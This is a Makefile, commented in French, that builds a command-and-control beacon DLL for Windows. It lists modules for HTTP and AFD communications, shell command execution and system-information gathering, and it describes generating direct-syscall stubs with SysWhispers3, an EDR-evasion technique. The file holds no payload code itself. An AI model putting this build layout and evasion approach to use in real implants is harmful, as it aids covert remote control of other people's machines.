# ═══════════════════════════════════════════════════════════════
# Beacon C2 - Full Syscalls Edition
# ═══════════════════════════════════════════════════════════════

CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -Wextra -O2

# LIBS : Full syscalls - zero dépendances externes 🎯
LIBS =

# ═══════════════════════════════════════════════════════════════
# STRUCTURE DES DOSSIERS
# ═══════════════════════════════════════════════════════════════

SRC_DIR = src
SYSCALL_DIR = syscalls

# ═══════════════════════════════════════════════════════════════
# FICHIERS SOURCES (nouvelle organisation)
# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
# Syscalls (SysWhispers3 inline assembly)
# ═══════════════════════════════════════════════════════════════
#
# ⚠️  IMPORTANT - Compilation sur Windows :
#
# 1. Ce Makefile utilise syscalls_stub.c pour la cross-compilation depuis macOS
# 2. Sur Windows, commentez la ligne suivante et décommentez celle d'après :
#
SYSCALL_SOURCES = $(SYSCALL_DIR)/syscalls_stub.c  # ← macOS/Linux cross-compilation
# SYSCALL_SOURCES = $(SYSCALL_DIR)/syscalls.c     # ← Windows native (vrai syscalls)
#
# 3. Sur Windows, générer syscalls.c avec SysWhispers3 :
#    python syswhispers.py --preset common -o syscalls
#
# ═══════════════════════════════════════════════════════════════

# Sources C par catégorie
CORE_SOURCES = $(SRC_DIR)/core/json.c \
               $(SRC_DIR)/core/unicode.c

COMMS_SOURCES = $(SRC_DIR)/comms/afd.c \
                $(SRC_DIR)/comms/http.c

COMMANDS_SOURCES = $(SRC_DIR)/commands/shell.c

SYSINFO_SOURCES = $(SRC_DIR)/sysinfo/gather.c

MAIN_SOURCES = $(SRC_DIR)/main.c

# Tous les fichiers C
SOURCES = $(MAIN_SOURCES) \
          $(CORE_SOURCES) \
          $(COMMS_SOURCES) \
          $(COMMANDS_SOURCES) \
          $(SYSINFO_SOURCES) \
          $(SYSCALL_SOURCES)

# ═══════════════════════════════════════════════════════════════
# CIBLES
# ═══════════════════════════════════════════════════════════════

OUTPUT = beacon.dll
OUTPUT_DEBUG = beacon_debug.dll

all: $(OUTPUT)

# Compilation DLL release
$(OUTPUT): $(SOURCES)
	$(CC) $(CFLAGS) -shared -o $@ $^ $(LIBS)
	@echo "✅ Beacon syscalls compilé: $(OUTPUT)"

# Compilation debug
debug: CFLAGS += -DDEBUG -g
debug: $(SOURCES)
	$(CC) $(CFLAGS) -shared -o $(OUTPUT_DEBUG) $^ $(LIBS)
	@echo "✅ Beacon debug compilé: $(OUTPUT_DEBUG)"

# Test EXE
test-exe: CFLAGS += -DDEBUG -g
test-exe: $(SOURCES)
	$(CC) $(CFLAGS) -o beacon_test.exe $^ $(LIBS) -mconsole
	@echo "✅ Test exe compilé: beacon_test.exe"

clean:
	rm -f $(OUTPUT) $(OUTPUT_DEBUG) beacon_test.exe
	@echo "✅ Nettoyé"

.PHONY: all debug test-exe clean
